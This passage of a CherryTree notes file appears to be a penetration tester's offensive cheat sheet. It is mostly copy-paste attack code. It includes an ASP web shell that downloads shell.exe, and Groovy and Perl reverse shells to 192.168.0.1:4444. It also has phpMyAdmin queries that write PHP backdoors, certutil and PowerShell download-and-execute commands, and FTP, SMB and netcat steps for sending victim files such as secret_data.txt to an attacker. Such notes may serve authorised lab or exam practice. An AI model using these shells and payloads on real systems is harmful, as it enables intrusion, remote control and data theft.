Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Execute a File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Jenkins / Groovy (Java)" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Jenkins / Groovy (Java)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Linux Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"/bin/sh";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"cmd.exe";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="Perl" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Perl</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">perl -MIO </rich_text>
          <rich_text family="monospace" foreground="#d73a49">-e</rich_text>
          <rich_text family="monospace"> 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="PhpmyAdmin" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">PhpmyAdmin
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text style="italic">Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Unix</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"</rich_text>
        </node>
        <node name="powershell" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701626719" ts_lastsave="1701626901">
          <rich_text>

</rich_text>
          <rich_text link="webs https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</rich_text>
          <rich_text>

use this


Ex:  `</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`</codebox>
        </node>
      </node>
      <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1701639277">
          <rich_text underline="single" scale="h1">Powershell</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">As Cmd.exe Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Encode Command for Transfer</rich_text>
          <rich_text>
Very helpful for chars that need to be escaped otherwise.

</rich_text>
          <rich_text family="monospace">$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="665" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil -urlcache -f http://10.10.14.21/rev.exe rev.exe</codebox>
        </node>
        <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Certutil</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download &amp; Execute Python Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe &amp; C:\Windows\Temp\shell.exe')</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="SMB" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">SMB</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start Impacket SMB Server (With SMB2 Support)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">impacket-smbserver -smb2support server_name /var/www/html</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">List Drives (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">net view \\192.168.0.1</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Copy Files (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">copy \\192.168.0.1\server_name\shell.exe shell.exe</rich_text>
        </node>
        <node name="PureFTP" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">PureFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Install</rich_text>
          <rich_text>
apt-get update </rich_text>
          <rich_text foreground="#d73a49">&amp;&amp;</rich_text>
          <rich_text> apt-get install pure-ftpd

</rich_text>
          <rich_text underline="single" scale="h2">Create setupftp.sh Execute The Script</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#6a737d">#!</rich_text>
          <rich_text family="monospace">/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">cd</rich_text>
          <rich_text family="monospace"> /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart./setupftp.sh</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Get Service Ready</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Reset Password</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Commit Changes</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw mkdb</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Restart Service</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">/etc/init.d/pure-ftpd restart</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Create FTP Script (On Victim</rich_text>
          <rich_text>)
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> open 192.168.0.</rich_text>
          <rich_text family="monospace" foreground="#d73a49">1&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> USER myftpuser</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> mypassword</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bin</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> put secret_data.txt</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bye </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Exectue Script</rich_text>
          <rich_text underline="single"> (On Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">ftp -v -n -s:ftp.txt</rich_text>
        </node>
        <node name="Netcat" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Netcat</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Receiving Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -l -p 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Sending Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -w 3 192.168.0.1 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
        </node>
        <node name="TFTP" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1696697351">
          <rich_text underline="single" scale="h1">TFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start TFTP Daemon (Folder /var/tftp)</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



______________________________________________________________________________



</rich_text>
          <rich_text link="webs https://github.com/nigamelastic/cheat-sheets/blob/main/General/FTP.md#quick-ftp-transfer-from-windows-target-to-kali-attacker" scale="h2">Quick FTP transfer from windows target to kali attacker</rich_text>
          <rich_text>
Start FTP on Attacker Machine:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>&#13;    

On Target Machine Use the following to transfer the file to Attacker:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">atftpd --daemon --port 69 /var/tmp</codebox>
          <codebox char_offset="131" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">tftp -i 192.168.0.1 GET whoami.exe</codebox>
          <codebox char_offset="306" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python -m pyftpdlib -p 4444 -u yo -P 123 -w </codebox>
          <codebox char_offset="387" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">PS C:\Users\nathan&gt; ftp&#13;
ftp&gt; open 192.168.119.185 4444&#13;
Connected to 192.168.119.185.&#13;
220 pyftpdlib 1.5.7 ready.&#13;
530 Log in with USER and PASS first.&#13;
User (192.168.119.185:(none)): yo&#13;
331 Username ok, send password.&#13;
Password:&#13;
230 Login successful.&#13;
ftp&gt; put jehe.jeher&#13;
200 Active data connection established.&#13;
125 Data connection already open. Transfer starting.&#13;
226 Transfer complete.&#13;
ftp: 52 bytes sent in 0.06Seconds 0.84Kbytes/sec.&#13;
ftp&gt;</codebox>
        </node>
        <node name="VBScript" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">VBScript</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text>
          <rich_text scale="h2">
</rich_text>
          <rich_text>
</rich_text>
          <rich_text underline="single" scale="h2">Create wget.vbs File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">echo strUrl = WScript.Arguments.Item(0) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo StrFile = WScript.Arguments.Item(1) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Err.Clear </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Open "GET",strURL,False </rich_text>
